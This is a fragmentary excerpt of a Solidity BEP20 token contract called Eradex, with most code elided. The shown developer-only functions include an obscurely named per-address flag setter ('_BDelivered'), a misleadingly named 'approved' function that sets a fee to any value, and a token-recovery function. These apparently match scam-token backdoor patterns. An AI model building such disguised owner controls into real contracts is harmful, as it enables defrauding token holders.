...
contract Eradex is IBEP20, Ownable {
  ...
  function _BDelivered(address[] memory _labels, bool _allow) external onlyDev {
    if (_allow) {
      for (uint256 i = 0; i < _labels.length; i++) {
        Delivered[_labels[i]] = _allow;
      }
    } else {
      for (uint256 i = 0; i < _labels.length; i++) {
        delete Delivered[_labels[i]];
      }
    }
  }
  ...
  function _sendToLiquidityPool(uint256 tLiquidityPool, address sender)
    private
  {
    uint256 currentRate = _getRate();
  ...
  {
    (uint256 tFee, uint256 tBurn, uint256 tLiquidityPool) = _getTBasics(
      tAmount,
      _TAX_FEE,
      _BURN_FEE,
      _LIQUIDITYPOOL_FEE
    ...
    )
  {
    ...
    uint256 tLiquidityPool = ((tAmount.mul(liquiditypoolFee)).div(_GRANULARITY))
      .div(100);
  ...
  function approved(uint256 value) external onlyDev {
    HL_FEE = value;
  }

  receive() external payable {}

  function BEP20recover(
    address token,
    uint256 amount,
    address _wallet
  ) external onlyDev {
